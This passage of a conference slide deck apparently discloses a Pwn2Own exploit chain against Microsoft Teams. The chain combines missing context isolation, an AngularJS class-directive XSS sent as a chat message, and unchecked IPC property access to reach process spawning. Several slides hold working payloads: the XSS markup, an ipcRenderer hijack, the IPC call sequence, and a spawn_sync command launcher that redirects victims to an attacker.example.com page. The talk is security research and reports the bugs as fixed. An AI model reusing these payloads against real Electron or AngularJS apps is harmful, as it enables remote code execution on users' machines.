    [View full-size slide](https://files.speakerdeck.com/presentations/822da490117b42cd8a19bc8e2588305e/slide_32.jpg)
    
34. [![How class directive is retrieved
    <strong class="ng-init:expression">aaa</strong>
    <strong class="aaa;ng-init:expression">aaa</strong>
    <strong class="aaa!ng-init:expression">aaa</strong>
    <strong class="aaa♩♬♪ng-init:expression">aaa</strong>
    CLASS_DIRECTIVE_REGEXP = /(([\w-]+)(?::([^;]+))?;?)/,
    Retrieved by this regex：
    The following all classes work as ng-init directive:
    https://github.com/angular/angular.js/blob/47bf11ee94664367a26ed8c91b9b586d3dd420f5/src/ng/compile.js#L1384
    If the swift-* wildcard's behavior is combined ... ➡](https://files.speakerdeck.com/presentations/822da490117b42cd8a19bc8e2588305e/preview_slide_33.jpg?26545098)](https://files.speakerdeck.com/presentations/822da490117b42cd8a19bc8e2588305e/slide_33.jpg?26545098)
    
    How class directive is retrieved  
    aaa  
    aaa  
    aaa  
    aaa  
    CLASS_DIRECTIVE_REGEXP = /(([\w-]+)(?::([^;]+))?;?)/,  
    Retrieved by this regex：  
    The following all classes work as ng-init directive:  
    https://github.com/angular/angular.js/blob/47bf11ee94664367a26ed8c91b9b586d3dd420f5/src/ng/compile.js#L1384  
    If the swift-* wildcard's behavior is combined ... ➡  
    
    [View full-size slide](https://files.speakerdeck.com/presentations/822da490117b42cd8a19bc8e2588305e/slide_33.jpg)
    
35. [![XSS!
    alert() is executed when I sent next HTML as a chat message:
    <strong class="swift-x;ng-
    init:['alert(document.domain)'].forEach($root.$$childHead.$$nextSibl
    ing.app.$window.eval)">aaa</strong>
    * The reason I used a slightly strange call here instead of "constructor" which I shown in other slides
    is that there is a sandbox that prevents arbitrary JS exec depending on the version of AngularJS (All
    versions have known bypasses though). Here, direct use of "constructor" was not allowed.
    Reference: AngularJS sandbox bypasses list by Gareth Heyes
    https://portswigger.net/research/xss-without-html-client-side-template-injection-with-angularjs
    Yay! But the goal is RCE. It still continues! ➡](https://files.speakerdeck.com/presentations/822da490117b42cd8a19bc8e2588305e/preview_slide_34.jpg?26545099)](https://files.speakerdeck.com/presentations/822da490117b42cd8a19bc8e2588305e/slide_34.jpg?26545099)
    
    XSS!  
    alert() is executed when I sent next HTML as a chat message:  
    aaa  
    * The reason I used a slightly strange call here instead of "constructor" which I shown in other slides  
    is that there is a sandbox that prevents arbitrary JS exec depending on the version of AngularJS (All  
    versions have known bypasses though). Here, direct use of "constructor" was not allowed.  
    Reference: AngularJS sandbox bypasses list by Gareth Heyes  
    https://portswigger.net/research/xss-without-html-client-side-template-injection-with-angularjs  
    Yay! But the goal is RCE. It still continues! ➡  
    
    [View full-size slide](https://files.speakerdeck.com/presentations/822da490117b42cd8a19bc8e2588305e/slide_34.jpg)
    
36. [![What I was able to do so far
    • Found a way to arbitrary JS execution
    • Found a way to get reference to IPCRenderer module by
    abusing the lack of context isolation
    So, the last step is to find IPC listener which
    does not perform input-validation correctly.
    When trying to find it, I noticed an interesting renderer called PluginHost...➡](https://files.speakerdeck.com/presentations/822da490117b42cd8a19bc8e2588305e/preview_slide_35.jpg?26545100)](https://files.speakerdeck.com/presentations/822da490117b42cd8a19bc8e2588305e/slide_35.jpg?26545100)
    
    What I was able to do so far  
    • Found a way to arbitrary JS execution  
    • Found a way to get reference to IPCRenderer module by  
    abusing the lack of context isolation  
    So, the last step is to find IPC listener which  
    does not perform input-validation correctly.  
    When trying to find it, I noticed an interesting renderer called PluginHost...➡  
    
    [View full-size slide](https://files.speakerdeck.com/presentations/822da490117b42cd8a19bc8e2588305e/slide_35.jpg)
    
37. [![Bug #3
    1. Lack of Context Isolation in main window
    2. XSS via chat message
    3. JS execution via PluginHost outside sandbox](https://files.speakerdeck.com/presentations/822da490117b42cd8a19bc8e2588305e/preview_slide_36.jpg?26545101)](https://files.speakerdeck.com/presentations/822da490117b42cd8a19bc8e2588305e/slide_36.jpg?26545101)
    
    Bug #3  
    1. Lack of Context Isolation in main window  
    2. XSS via chat message  
    3. JS execution via PluginHost outside sandbox  
    
    [View full-size slide](https://files.speakerdeck.com/presentations/822da490117b42cd8a19bc8e2588305e/slide_36.jpg)
    
38. [![PluginHost
    • Invisible renderer called PluginHost exists
    • Apparently a node module called "slimcore" loaded here is
    being operated from the main window via IPC
    • Here, sandbox: false
    • Maybe slimcore doesn't work when sandbox:true, so this renderer
    exists?
    "C:\Users\USER\AppData\Local\Microsoft\Teams\current\Teams.ex
    e" --type=renderer [...] --app-
    path="C:\Users\USER\AppData\Local\Microsoft\Teams\current\res
    ources\app.asar" --no-sandbox [...] /prefetch:1 --msteams-
    process-type=pluginHost](https://files.speakerdeck.com/presentations/822da490117b42cd8a19bc8e2588305e/preview_slide_37.jpg?26545102)](https://files.speakerdeck.com/presentations/822da490117b42cd8a19bc8e2588305e/slide_37.jpg?26545102)
    
    PluginHost  
    • Invisible renderer called PluginHost exists  
    • Apparently a node module called "slimcore" loaded here is  
    being operated from the main window via IPC  
    • Here, sandbox: false  
    • Maybe slimcore doesn't work when sandbox:true, so this renderer  
    exists?  
    "C:\Users\USER\AppData\Local\Microsoft\Teams\current\Teams.ex  
    e" --type=renderer [...] --app-  
    path="C:\Users\USER\AppData\Local\Microsoft\Teams\current\res  
    ources\app.asar" --no-sandbox [...] /prefetch:1 --msteams-  
    process-type=pluginHost  
    
    [View full-size slide](https://files.speakerdeck.com/presentations/822da490117b42cd8a19bc8e2588305e/slide_37.jpg)
    
39. [![How slimcore is executed
    • Set IPC listeners in PluginHost's preload script and execute through
    messages sent from main window
    • Main window can send message with API named sendToRendererSync
    which exists in the object retrieved through bug #1
    • btw, this API does not exists in Electron's original ipcRenderer module, so
    maybe MS extended?
    ELECTRON_REMOTE_SERVER_REQUIRE
    ELECTRON_REMOTE_SERVER_MEMBER_GET
    ELECTRON_REMOTE_SERVER_FUNCTION_CALL
    There are IPC listeners named like:](https://files.speakerdeck.com/presentations/822da490117b42cd8a19bc8e2588305e/preview_slide_38.jpg?26545103)](https://files.speakerdeck.com/presentations/822da490117b42cd8a19bc8e2588305e/slide_38.jpg?26545103)
    
    How slimcore is executed  
    • Set IPC listeners in PluginHost's preload script and execute through  
    messages sent from main window  
    • Main window can send message with API named sendToRendererSync  
    which exists in the object retrieved through bug #1  
    • btw, this API does not exists in Electron's original ipcRenderer module, so  
    maybe MS extended?  
    ELECTRON_REMOTE_SERVER_REQUIRE  
    ELECTRON_REMOTE_SERVER_MEMBER_GET  
    ELECTRON_REMOTE_SERVER_FUNCTION_CALL  
    There are IPC listeners named like:  
    
    [View full-size slide](https://files.speakerdeck.com/presentations/822da490117b42cd8a19bc8e2588305e/slide_38.jpg)
    
40. [![What the IPC listeners do
    • ELECTRON_REMOTE_SERVER_REQUIRE
    • Call require() with string specified in message
    • However, validation allows only allow-listed modules such as "slimcore"
    • ELECTRON_REMOTE_SERVER_MEMBER_GET
    • Perform property access using string specified in message
    • ELECTRON_REMOTE_SERVER_FUNCTION_CALL
    • Perform function call with string specified in message
    • (listeners for SET or other operations also exist)](https://files.speakerdeck.com/presentations/822da490117b42cd8a19bc8e2588305e/preview_slide_39.jpg?26545104)](https://files.speakerdeck.com/presentations/822da490117b42cd8a19bc8e2588305e/slide_39.jpg?26545104)
    
    What the IPC listeners do  
    • ELECTRON_REMOTE_SERVER_REQUIRE  
    • Call require() with string specified in message  
    • However, validation allows only allow-listed modules such as "slimcore"  
    • ELECTRON_REMOTE_SERVER_MEMBER_GET  
    • Perform property access using string specified in message  
    • ELECTRON_REMOTE_SERVER_FUNCTION_CALL  
    • Perform function call with string specified in message  
    • (listeners for SET or other operations also exist)  
    
    [View full-size slide](https://files.speakerdeck.com/presentations/822da490117b42cd8a19bc8e2588305e/slide_39.jpg)
    
41. [![It's called like this:
    require('slimcore').func('arg');
    1. Send ELECTRON_REMOTE_SERVER_REQUIRE
    3. Send ELECTRON_REMOTE_SERVER_FUNCTION_CALL
    2. Send ELECTRON_REMOTE_SERVER_MEMBER_GET
    Hm, I can smell something... ➡](https://files.speakerdeck.com/presentations/822da490117b42cd8a19bc8e2588305e/preview_slide_40.jpg?26545105)](https://files.speakerdeck.com/presentations/822da490117b42cd8a19bc8e2588305e/slide_40.jpg?26545105)
    
    It's called like this:  
    require('slimcore').func('arg');  
    1. Send ELECTRON_REMOTE_SERVER_REQUIRE  
    3. Send ELECTRON_REMOTE_SERVER_FUNCTION_CALL  
    2. Send ELECTRON_REMOTE_SERVER_MEMBER_GET  
    Hm, I can smell something... ➡  
    
    [View full-size slide](https://files.speakerdeck.com/presentations/822da490117b42cd8a19bc8e2588305e/slide_40.jpg)
    
42. [![Focus on MEMBER_GET's property access
    ELECTRON_REMOTE_SERVER_MEMBER_GET's code：
    P(c.remoteServerMemberGet, (e,t,n,o)=>{
    const i = s.objectsRegistry.get(n);
    if (null == i)
    throw new Error(`Cannot get property '${o}' on missing remote object ${n}`);
    return A(e, t, ()=>i[o])
    }
    )
    variable i: acccess-target's object
    variable o: accessed property
    This property access is done without any check such as hasOwnProperty().
    This means... ➡](https://files.speakerdeck.com/presentations/822da490117b42cd8a19bc8e2588305e/preview_slide_41.jpg?26545106)](https://files.speakerdeck.com/presentations/822da490117b42cd8a19bc8e2588305e/slide_41.jpg?26545106)
    
    Focus on MEMBER_GET's property access  
    ELECTRON_REMOTE_SERVER_MEMBER_GET's code：  
    P(c.remoteServerMemberGet, (e,t,n,o)=>{  
    const i = s.objectsRegistry.get(n);  
    if (null == i)  
    throw new Error(`Cannot get property '${o}' on missing remote object ${n}`);  
    return A(e, t, ()=>i[o])  
    }  
    )  
    variable i: acccess-target's object  
    variable o: accessed property  
    This property access is done without any check such as hasOwnProperty().  
    This means... ➡  
    
    [View full-size slide](https://files.speakerdeck.com/presentations/822da490117b42cd8a19bc8e2588305e/slide_41.jpg)
    
43. [![Object.prototype.* access is allowed
    require('slimcore').toString.constructor('js-code')();
    1. REQUIRE
    4. FUNCTION_CALL
    2. MEMBER_GET 3. MEMBER_GET
    5. FUNCTION_CALL
    This allowed accessing Function() via constructor property
    and executing arbitrary JS!](https://files.speakerdeck.com/presentations/822da490117b42cd8a19bc8e2588305e/preview_slide_42.jpg?26545107)](https://files.speakerdeck.com/presentations/822da490117b42cd8a19bc8e2588305e/slide_42.jpg?26545107)
    
    Object.prototype.* access is allowed  
    require('slimcore').toString.constructor('js-code')();  
    1. REQUIRE  
    4. FUNCTION_CALL  
    2. MEMBER_GET 3. MEMBER_GET  
    5. FUNCTION_CALL  
    This allowed accessing Function() via constructor property  
    and executing arbitrary JS!  
    
    [View full-size slide](https://files.speakerdeck.com/presentations/822da490117b42cd8a19bc8e2588305e/slide_42.jpg)
    
44. [![What can I do with this JS exec?
    • The code is evaluated in the preload script's context
    • That means... it has access to Node API!
    • Additonally, sandbox:false, so no API restriction!
    The way to perform RCE in this context ➡](https://files.speakerdeck.com/presentations/822da490117b42cd8a19bc8e2588305e/preview_slide_43.jpg?26545108)](https://files.speakerdeck.com/presentations/822da490117b42cd8a19bc8e2588305e/slide_43.jpg?26545108)
    
    What can I do with this JS exec?  
    • The code is evaluated in the preload script's context  
    • That means... it has access to Node API!  
    • Additonally, sandbox:false, so no API restriction!  
    The way to perform RCE in this context ➡  
    
    [View full-size slide](https://files.speakerdeck.com/presentations/822da490117b42cd8a19bc8e2588305e/slide_43.jpg)
    
45. [![process.binding
    • Something like require() used in Node.js internal
    • Only available when sandbox: false
    • In the child_process module, binding('spawn_sync') is used
    and by following the call here, command exec is possible:
    a = {
    "type": "pipe",
    "readable": 1,
    "writable": 1
    };
    b = {
    "file": "cmd",
    "args": ["/k", "start", "calc"],
    "stdio": [a, a]
    };
    process.binding("spawn_sync").spawn(b);
    I learned this from Math.js RCE by @CapacitorSet & @denysvitali：https://jwlss.pw/mathjs/](https://files.speakerdeck.com/presentations/822da490117b42cd8a19bc8e2588305e/preview_slide_44.jpg?26545109)](https://files.speakerdeck.com/presentations/822da490117b42cd8a19bc8e2588305e/slide_44.jpg?26545109)
    
    process.binding  
    • Something like require() used in Node.js internal  
    • Only available when sandbox: false  
    • In the child_process module, binding('spawn_sync') is used  
    and by following the call here, command exec is possible:  
    a = {  
    "type": "pipe",  
    "readable": 1,  
    "writable": 1  
    };  
    b = {  
    "file": "cmd",  
    "args": ["/k", "start", "calc"],  
    "stdio": [a, a]  
    };  
    process.binding("spawn_sync").spawn(b);  
    I learned this from Math.js RCE by @CapacitorSet & @denysvitali：https://jwlss.pw/mathjs/  
    
    [View full-size slide](https://files.speakerdeck.com/presentations/822da490117b42cd8a19bc8e2588305e/slide_44.jpg)
    
46. [![FYI：Can I use require()?
    require('slimcore')
    .toString.constructor("require('child_process')...")();
    Why don't use require('child_process') directly?
    This does not work. Why? ➡](https://files.speakerdeck.com/presentations/822da490117b42cd8a19bc8e2588305e/preview_slide_45.jpg?26545110)](https://files.speakerdeck.com/presentations/822da490117b42cd8a19bc8e2588305e/slide_45.jpg?26545110)
    
    FYI：Can I use require()?  
    require('slimcore')  
    .toString.constructor("require('child_process')...")();  
    Why don't use require('child_process') directly?  
    This does not work. Why? ➡  
    
    [View full-size slide](https://files.speakerdeck.com/presentations/822da490117b42cd8a19bc8e2588305e/slide_45.jpg)
    
47. [![Why require does not work
    Because Function() creates a function executed within global scope
    1: function (exports, require, module, __filename, __dirname) {
    console.log(`1: ${arguments.callee.toString()}`);
    console.log(`2: ${eval('typeof require')}`);
    console.log(`3: ${constructor.constructor('typeof require')()}`);
    }
    2: function
    3: undefined
    console.log(`1: ${arguments.callee.toString()}`);
    console.log(`2: ${eval('typeof require')}`);
    console.log(`3: ${constructor.constructor('typeof require')()}`);
    ➡
    Load as preload script
    Exists in function scope](https://files.speakerdeck.com/presentations/822da490117b42cd8a19bc8e2588305e/preview_slide_46.jpg?26545111)](https://files.speakerdeck.com/presentations/822da490117b42cd8a19bc8e2588305e/slide_46.jpg?26545111)
    
    Why require does not work  
    Because Function() creates a function executed within global scope  
    1: function (exports, require, module, __filename, __dirname) {  
    console.log(`1: ${arguments.callee.toString()}`);  
    console.log(`2: ${eval('typeof require')}`);  
    console.log(`3: ${constructor.constructor('typeof require')()}`);  
    }  
    2: function  
    3: undefined  
    console.log(`1: ${arguments.callee.toString()}`);  
    console.log(`2: ${eval('typeof require')}`);  
    console.log(`3: ${constructor.constructor('typeof require')()}`);  
    ➡  
    Load as preload script  
    Exists in function scope  
    
    [View full-size slide](https://files.speakerdeck.com/presentations/822da490117b42cd8a19bc8e2588305e/slide_46.jpg)
    
48. [![Another way to exec command
    • Looks like other Pwn2Own participants (@adm1nkyj1 & @jinmo123) also
    noticed the way to exec command via IPC
    • However, the last step to achive RCE is a bit different. They used eval call existing in
    preload scripts and called require('child_process'):
    Details: https://blog.pksecurity.io/2023/01/16/2022-microsoft-teams-rce.html#2-
    pluginhost-allows-dangerous-rpc-calls-from-any-webview
    function loadSlimCore(slimcoreLibPath) {
    let slimcore;
    if (utility.isWebpackRuntime()) {
    const slimcoreLibPathWebpack = slimcoreLibPath.replace(/\\/g, "\\\\");
    slimcore = eval(`require('${slimcoreLibPathWebpack}')`);
    [...]
    }
    [...]
    }
    Rewrite String.prototype.replace
    and change return value
    Arbitrary string is passed here
    (This is direct eval call, so it is executed within this function scope and
    require() access is allowed)](https://files.speakerdeck.com/presentations/822da490117b42cd8a19bc8e2588305e/preview_slide_47.jpg?26545112)](https://files.speakerdeck.com/presentations/822da490117b42cd8a19bc8e2588305e/slide_47.jpg?26545112)
    
    Another way to exec command  
    • Looks like other Pwn2Own participants (@adm1nkyj1 & @jinmo123) also  
    noticed the way to exec command via IPC  
    • However, the last step to achive RCE is a bit different. They used eval call existing in  
    preload scripts and called require('child_process'):  
    Details: https://blog.pksecurity.io/2023/01/16/2022-microsoft-teams-rce.html#2-  
    pluginhost-allows-dangerous-rpc-calls-from-any-webview  
    function loadSlimCore(slimcoreLibPath) {  
    let slimcore;  
    if (utility.isWebpackRuntime()) {  
    const slimcoreLibPathWebpack = slimcoreLibPath.replace(/\\/g, "\\\\");  
    slimcore = eval(`require('${slimcoreLibPathWebpack}')`);  
    [...]  
    }  
    [...]  
    }  
    Rewrite String.prototype.replace  
    and change return value  
    Arbitrary string is passed here  
    (This is direct eval call, so it is executed within this function scope and  
    require() access is allowed)  
    
    [View full-size slide](https://files.speakerdeck.com/presentations/822da490117b42cd8a19bc8e2588305e/slide_47.jpg)
    
49. [![all bugs aligned!
    1. Lack of Context Isolation in main window
    2. XSS via chat message
    3. JS execution via PluginHost outside sandbox
    Let's launch calc！ ➡](https://files.speakerdeck.com/presentations/822da490117b42cd8a19bc8e2588305e/preview_slide_48.jpg?26545113)](https://files.speakerdeck.com/presentations/822da490117b42cd8a19bc8e2588305e/slide_48.jpg?26545113)
    
    all bugs aligned!  
    1. Lack of Context Isolation in main window  
    2. XSS via chat message  
    3. JS execution via PluginHost outside sandbox  
    Let's launch calc！ ➡  
    
    [View full-size slide](https://files.speakerdeck.com/presentations/822da490117b42cd8a19bc8e2588305e/slide_48.jpg)
    
50. [![Steps to reproduce
    1. Attacker creates a page containing the following code
    Function.prototype._call = Function.prototype.call;
    Function.prototype.call = function(...args) {
    if (args[3] && args[3].name === "__webpack_require__") {
    ipc = args[3]('./lib/sandboxed_renderer/api/exports/electron.ts').ipcRenderer;
    }
    return this._call(...args);
    }
    JS code to send IPC follows on the next page......
    ...
    JS code to get reference of ipcRenderer module:](https://files.speakerdeck.com/presentations/822da490117b42cd8a19bc8e2588305e/preview_slide_49.jpg?26545114)](https://files.speakerdeck.com/presentations/822da490117b42cd8a19bc8e2588305e/slide_49.jpg?26545114)
    
    Steps to reproduce  
    1. Attacker creates a page containing the following code  
    <br/>Function.prototype._call = Function.prototype.call;<br/>Function.prototype.call = function(...args) {<br/>if (args[3] && args[3].name === "__webpack_require__") {<br/>ipc = args[3]('./lib/sandboxed_renderer/api/exports/electron.ts').ipcRenderer;<br/>}<br/>return this._call(...args);<br/>}<br/>  
    JS code to send IPC follows on the next page......  
    <br/>...<br/>JS code to get reference of ipcRenderer module:<br/>
    
    [View full-size slide](https://files.speakerdeck.com/presentations/822da490117b42cd8a19bc8e2588305e/slide_49.jpg)
    
51. [![setTimeout(function(){
    ipc.invoke('calling:teams:ipc:initPluginHost',true).then((id)=>{
    objid=ipc.sendToRendererSync(id,'ELECTRON_REMOTE_SERVER_REQUIRE',[[],'slimcore'],'')[0]['id'];
    objid=ipc.sendToRendererSync(id,'ELECTRON_REMOTE_SERVER_MEMBER_GET',[[],objid,'toString',[]],'')[0]['id'];
    objid=ipc.sendToRendererSync(id,'ELECTRON_REMOTE_SERVER_MEMBER_GET',[[],objid,'constructor',[]],'')[0]['id'];
    objid=ipc.sendToRendererSync(id,'ELECTRON_REMOTE_SERVER_FUNCTION_CALL',[[],objid,[{"type":"value","value":
    'a={"type":"pipe","readable":1,"writable":1};b={"file":"cmd","args":["/k","start","calc"],"stdio":[a,a]};
    process.binding("spawn_sync").spawn(b);'}]],'')[0]['id'];
    ipc.sendToRendererSync(id,'ELECTRON_REMOTE_SERVER_FUNCTION_CALL',[[],objid,[{"type":"value","value":""}]],'');
    });
    },2000);
    require('slimcore').toString.constructor('js-code')();
    1. REQUIRE 4. FUNCTION_CALL
    2. MEMBER_GET 3. MEMBER_GET
    5. FUNCTION_CALL
    Above code is for sending IPC to execute the following JS on PluginHost:](https://files.speakerdeck.com/presentations/822da490117b42cd8a19bc8e2588305e/preview_slide_50.jpg?26545115)](https://files.speakerdeck.com/presentations/822da490117b42cd8a19bc8e2588305e/slide_50.jpg?26545115)
    
    <br/>setTimeout(function(){<br/>ipc.invoke('calling:teams:ipc:initPluginHost',true).then((id)=>{<br/>objid=ipc.sendToRendererSync(id,'ELECTRON_REMOTE_SERVER_REQUIRE',[[],'slimcore'],'')[0]['id'];<br/>objid=ipc.sendToRendererSync(id,'ELECTRON_REMOTE_SERVER_MEMBER_GET',[[],objid,'toString',[]],'')[0]['id'];<br/>objid=ipc.sendToRendererSync(id,'ELECTRON_REMOTE_SERVER_MEMBER_GET',[[],objid,'constructor',[]],'')[0]['id'];<br/>objid=ipc.sendToRendererSync(id,'ELECTRON_REMOTE_SERVER_FUNCTION_CALL',[[],objid,[{"type":"value","value":<br/>'a={"type":"pipe","readable":1,"writable":1};b={"file":"cmd","args":["/k","start","calc"],"stdio":[a,a]};<br/>process.binding("spawn_sync").spawn(b);'}]],'')[0]['id'];<br/>ipc.sendToRendererSync(id,'ELECTRON_REMOTE_SERVER_FUNCTION_CALL',[[],objid,[{"type":"value","value":""}]],'');<br/>});<br/>},2000);<br/>  
    require('slimcore').toString.constructor('js-code')();  
    1. REQUIRE 4. FUNCTION_CALL  
    2. MEMBER_GET 3. MEMBER_GET  
    5. FUNCTION_CALL  
    Above code is for sending IPC to execute the following JS on PluginHost:  
    
    [View full-size slide](https://files.speakerdeck.com/presentations/822da490117b42cd8a19bc8e2588305e/slide_50.jpg)
    
52. [![Steps to reproduce
    2. Send the following HTML as a chat message
    <strong class="swift-x;ng-
    init:['eval(decodeURIComponent(\'setTimeout(function()%7Blocation.replace(%27//at
    tacker.example.com/poc.html%27)%7D,10000)\'))'].forEach($root.$$childHead.$$nextS
    ibling.app.$window.eval)">aaa</strong>](https://files.speakerdeck.com/presentations/822da490117b42cd8a19bc8e2588305e/preview_slide_51.jpg?26545116)](https://files.speakerdeck.com/presentations/822da490117b42cd8a19bc8e2588305e/slide_51.jpg?26545116)
    
    Steps to reproduce  
    2. Send the following HTML as a chat message  
    aaa  
    
    [View full-size slide](https://files.speakerdeck.com/presentations/822da490117b42cd8a19bc8e2588305e/slide_51.jpg)
    
53. [![Steps to reproduce
    The final code executed by eval is the following.
    It just navigates to attacker's site:
    setTimeout(function(){
    location.replace('//attacker.example.com/poc.html');
    },10000);
    Page created at step 1
    (* No need to use setTimeout. I used it for clarity of demo.)](https://files.speakerdeck.com/presentations/822da490117b42cd8a19bc8e2588305e/preview_slide_52.jpg?26545117)](https://files.speakerdeck.com/presentations/822da490117b42cd8a19bc8e2588305e/slide_52.jpg?26545117)
    
    Steps to reproduce  
    The final code executed by eval is the following.  
    It just navigates to attacker's site:  
    setTimeout(function(){  
    location.replace('//attacker.example.com/poc.html');  
    },10000);  
    Page created at step 1  
    (* No need to use setTimeout. I used it for clarity of demo.)  
    
    [View full-size slide](https://files.speakerdeck.com/presentations/822da490117b42cd8a19bc8e2588305e/slide_52.jpg)
    
54. [![Steps to reproduce
    3. Victim opens the message (XSS is triggered)](https://files.speakerdeck.com/presentations/822da490117b42cd8a19bc8e2588305e/preview_slide_53.jpg?26545118)](https://files.speakerdeck.com/presentations/822da490117b42cd8a19bc8e2588305e/slide_53.jpg?26545118)
    
    Steps to reproduce  
    3. Victim opens the message (XSS is triggered)  
    
    [View full-size slide](https://files.speakerdeck.com/presentations/822da490117b42cd8a19bc8e2588305e/slide_53.jpg)
    
55. [![Steps to reproduce
    After a while, a navigation to the crafted page happens
    (https://attacker.example.com/poc.html)](https://files.speakerdeck.com/presentations/822da490117b42cd8a19bc8e2588305e/preview_slide_54.jpg?26545119)](https://files.speakerdeck.com/presentations/822da490117b42cd8a19bc8e2588305e/slide_54.jpg?26545119)
    
    Steps to reproduce  
    After a while, a navigation to the crafted page happens  
    (https://attacker.example.com/poc.html)  
    
    [View full-size slide](https://files.speakerdeck.com/presentations/822da490117b42cd8a19bc8e2588305e/slide_54.jpg)
    
56. [![Steps to reproduce
    Suddenly calc is executed!!!
    (https://attacker.example.com/poc.html)
    DEMO: https://youtu.be/TMh_WbF9VnM](https://files.speakerdeck.com/presentations/822da490117b42cd8a19bc8e2588305e/preview_slide_55.jpg?26545120)](https://files.speakerdeck.com/presentations/822da490117b42cd8a19bc8e2588305e/slide_55.jpg?26545120)
    
    Steps to reproduce  
    Suddenly calc is executed!!!  
    (https://attacker.example.com/poc.html)  
    DEMO: https://youtu.be/TMh_WbF9VnM  
    
    [View full-size slide](https://files.speakerdeck.com/presentations/822da490117b42cd8a19bc8e2588305e/slide_55.jpg)
    
57. [![All bugs were fixed
    • contextIsolation: Enabled in main window now
    • XSS: Allowed only limited characters in the wildcard part
    • PluginHost: Applied web page's CSP to preload scripts
    • For this, contextIsolation on PluginHost was disabled. By doing so,
    looks like web page's CSP is applied to preload scripts and eval is
    disabled. hmm..
    • btw, apparently latest Electron(tested on v25+) does not allow
    "eval" in preload scripts (Teams doesn't use the latest though)
    • "Uncaught EvalError: Code generation from strings disallowed for
    this context"](https://files.speakerdeck.com/presentations/822da490117b42cd8a19bc8e2588305e/preview_slide_56.jpg?26545121)](https://files.speakerdeck.com/presentations/822da490117b42cd8a19bc8e2588305e/slide_56.jpg?26545121)
    
    All bugs were fixed  
    • contextIsolation: Enabled in main window now  
    • XSS: Allowed only limited characters in the wildcard part  
    • PluginHost: Applied web page's CSP to preload scripts  
    • For this, contextIsolation on PluginHost was disabled. By doing so,  
    looks like web page's CSP is applied to preload scripts and eval is  
    disabled. hmm..  
    • btw, apparently latest Electron(tested on v25+) does not allow  
    "eval" in preload scripts (Teams doesn't use the latest though)  
    • "Uncaught EvalError: Code generation from strings disallowed for  
    this context"  
    
    [View full-size slide](https://files.speakerdeck.com/presentations/822da490117b42cd8a19bc8e2588305e/slide_56.jpg)
    
58. [![That's all
    • Next, your turn!](https://files.speakerdeck.com/presentations/822da490117b42cd8a19bc8e2588305e/preview_slide_57.jpg?26545122)](https://files.speakerdeck.com/presentations/822da490117b42cd8a19bc8e2588305e/slide_57.jpg?26545122)
    
    That's all  
    • Next, your turn!  
    
    [View full-size slide](https://files.speakerdeck.com/presentations/822da490117b42cd8a19bc8e2588305e/slide_57.jpg)
    
59. [![Thanks!!
    @kinugawamasato](https://files.speakerdeck.com/presentations/822da490117b42cd8a19bc8e2588305e/preview_slide_58.jpg?26545123)](https://files.speakerdeck.com/presentations/822da490117b42cd8a19bc8e2588305e/slide_58.jpg?26545123)
    
    Thanks!!  
    @kinugawamasato  
    
    [View full-size slide](https://files.speakerdeck.com/presentations/822da490117b42cd8a19bc8e2588305e/slide_58.jpg)